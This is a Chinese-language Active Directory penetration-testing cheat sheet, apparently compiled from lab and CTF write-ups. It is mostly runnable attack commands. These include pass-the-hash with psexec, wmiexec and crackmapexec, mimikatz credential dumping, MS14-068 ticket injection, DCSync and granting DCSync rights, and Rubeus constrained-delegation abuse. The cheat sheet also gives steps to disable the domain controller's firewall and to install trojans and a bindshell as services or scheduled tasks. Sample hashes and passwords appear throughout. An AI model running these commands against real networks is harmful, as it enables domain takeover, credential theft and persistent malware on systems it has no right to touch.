[干货 | 域内敏感信息搜集](https://mp.weixin.qq.com/s/nFOAb__c162gMhve3MEh_Q)
[横向移动之PTH、PPT、PTK](https://mp.weixin.qq.com/s/uWuNqKYloTQCifKjsXMB2Q)

## 信息收集

```shell
net time /domain # 判断当前主机是否在域内
net user /domain
获取域内用户的详细信息：
wmic useraccount get /all

net group "domain controllers" /domain # 查看域控 OWA$
ping OWA # 域控主机即可获得域控IP
# 查看所有域成员计算机列表
net group "domain computers" /domain
# 查看域管理员, 看到管理员后 meterpreter > ps , migrate xxx 偷令牌
Net group "domain admins" /domain
# 登陆本机的域管理员
net localgroup administrators /domain
# 查看域成员 假设域为god
net view /domain:god
# 当前计算机名
hostname
# 查看域控列表
beacon> net dclist

# 三种情况
##1. 存在域，但当前用户不是域用户，提示说明权限不够
##2. 存在域，并且当前用户是域用户
##3. 当前网络环境为工作组，不存在域
```
sharehound 查看收集的信息


## 攻击 

```shell
# PSTools 使用哈希传递(PTH)攻击 https://mp.weixin.qq.com/s/6BYAeo-5I1XMejyC5ec1pw
PsExec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2022 -s cmd #成功，拿下域控了。
# impact: pip install impacket, win下pyexec用对应的py文件 python psexec.py xxxxxxx
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 #成功，拿下域控了。
psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.141 #成功，拿下域控了。
# impact: 连接cmd
proxychains python3 wmiexec.py 'administrator:123qwe!ASD@192.168.93.20'
# smbclient 上传文件
proxychains smbclient //192.168.93.20/c$ -U administrator%password
smb > put mimikatz.exe # 上传文件

# msf meterpreter
meterpreter > getsystem
meterpreter > getuid
meterpreter > ps     # 非system时, 查看system权限进程，迁移
meterpreter > migrate 216
meterpreter > load kiwi  # 读取密码, 如果是64位的迁移到64位进程才能看明文
meterpreter > getsystem
meterpreter > creds_kerberos

# msf incognito https://mp.weixin.qq.com/s/iPv5sT50orqW79SmbVaFEQ
use incognito      //进入incognito模块
list_tokens -u    //列出令牌
impersonate_token "WUHANKQ\Administrator"    //选择要窃取的账号
#验证权限
shell          
chcp 65001      //活动代码页字符为UTF-8编码
whoami    

# mimikatz
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log


win7共享给域控
copy c:\phpstudy\srn7final.exe \\192.168.52.138\c$
设置计划任务启动木马
schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2021"
```
### ms14-068生成票据, 注入票据
[L1](https://mp.weixin.qq.com/s/tTuH3_YY_C0AuPSLfo8mTQ) [L2](https://www.freebuf.com/articles/web/340783.html)


整理信息

```ts
USER：douser
Domain：DEMO.COM
NTLM：bc23b0b4d5bf5ff42bc61fb62e13886e
SID：S-1-5-21-979886063-1111900045-1414766810-1107
PASSWORD：Dotest123
```
上传MS14-068

```shell
MS14-068.exe -u douser@DEMO.COM -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130
dir 
```

通过 mimikatz 导入TGT票据将写入，从而提升为域管理员
```bat
kerberos::purge
kerberos::ptc TGT_douser@DEMO.COM.ccache
exit

dir \\WIN-ENS2VR5TR3N\c$


:: 通过文件共享将马复制到域控中
:: 运行方式2 sc , 关闭域控防火墙 上马
:: cmd 下切换高级用户权限
net use \\192.168.138.138\ipc$ "dc123.com" /user:"administrator"
sc \\WIN-ENS2VR5TR3N create ProFirewall binpath= "netsh advfirewall set allprofiles state off"
sc \\WIN-ENS2VR5TR3N start ProFirewall
sc \\WIN-ENS2VR5TR3N create Startup binpath= "C:\shell.exe"
sc \\WIN-ENS2VR5TR3N start Startup

:: 运行方式1 schtasks
(
echo netsh advfirewall set allprofiles state off
echo shell.exe
) >1.bat
copy 1.bat \\WIN-ENS2VR5TR3N\c$ /y
copy shell.exe \\WIN-ENS2VR5TR3N\c$ /y
:: 运行方式2 schtasks
schtasks /create /S WIN-ENS2VR5TR3N /TN "test" /TR c:/1.bat /SC MINUTE /ST 21:27 /ru system /f

:: 下一步 psexec
```

### shadow-credentials
[Link](https://zhuanlan.zhihu.com/p/581451146)

条件: 以下账户拥有 msDS-KeyCredentialLink 属性的写入权限：

* 域管理员账户
* Key Admins 组中的账户
* Enterprise Key Admins 组中的账户
* 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
* 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限

### Dsync攻击 
[Dsync](http://www.malabis.site/2022/11/12/春秋云镜-Initial/#横向移动)

DCSync攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

* Administrators组内的用户
* Domain Admins组内的用户
* Enterprise Admins组内的用户
* 域控制器的计算机帐户
* 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。

```sh
meterpreter > load kiwi
meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
# 拿到hash后 通过哈希传递 拿到域控
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```
#### 添加 dsync权限, 见 春秋云境——Exchange 
```
方式一
proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :0beff597ee3d7025627b2d9aa015bf4c -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.3.2
方式二
powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIde Zhangtong -Rights DCSync -Verbose"
```

### DC Takeover
[Ichunqiu云境 —— Tsclient Writeup](https://mp.weixin.qq.com/s/1VDwjl_fhpZOKUy5-ZHCTQ)
### mimikatz PTH传递攻击

```sh
sekurlsa::pth /user:administrator /domain:g1ts /ntlm:ad5a870327c02f83cb947af6a94a4c23
mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe"
# pth 传递弹出cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
# pth 读取数据
proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
# pth 攻击
python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.32 "whoami"
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
```

pth连接后上传马
```sh
copy 4444.exe \\192.168.3.32\c$\  # 上传木马到目标机器中
sc \\192.168.3.32 create bindshell binpath= "c:\4444.exe" # 创建shell服务并绑定文件
sc \\192.168.3.32 start bindshell # 启动bindshell服务
```

### pth远程桌面登录
```sh
# mimikatz
privilege::debug
sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d "/run:mstsc.exe /restrictedadmin"
# freerdp
xfreerdp /u:administrator /p:test123! /v:192.168.62.136 /cert-ignore
xfreerdp /u:administrator /pth:d25ecd13fddbb542d2e16da4f9e0333d /v:192.168.62.136 /cert-ignore
```

### 约束委派攻击
[1](https://mp.weixin.qq.com/s/O2LC0Qk55AAOqLGTJmzISg)
[2](https://zhuanlan.zhihu.com/p/581577873)

```bash
meterpreter > load kiwi
meterpreter > creds_all
```
约束委派攻击
* 1. 通过Rubeus申请机器账户MSSQLSERVER的TGT

```bash
Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:<NTLM> /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap
```
* 2. 然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中
```bash
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:LDAP/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjC....==
```
* 3. LDAP 服务具有DCSync权限，导出域内用户的Hash
```bash
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
    kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
# 获得域管理员哈希 1a19251fbd935969832616366ae3fe62
```
* 4. WMI横向 登录域控
```
python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
```
## Tool
### Rubeus
Rubeus是用于测试Kerberos的利用工具。

Rubeus kerberoast 查看哪些域用户注册了SPN，也为后续Kerberoasting做准备：

```sh
.\Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
# 配合使用DFSCoerce强制触发回连到win19并且获取到DC01的TGT
python3 dfscoerce.py -u 'win19$' -hashes :917234367460f3f2817aa4439f97e636 -d xiaorang.lab win19 172.22.4.7
```

## net use 映射磁盘

```bash
net use P: /del
net use P: \\168.1.1.0\zhq3211
net use P: /del
net use P: \\Name\zhq3211
```
# Article

[域内定位个人PC的三种方式](https://mp.weixin.qq.com/s/uXTo2AbmvMeNesR8rAjImw)
[【内网域渗透系列教程】](https://www.bilibili.com/video/BV1xb4y1y7ju/)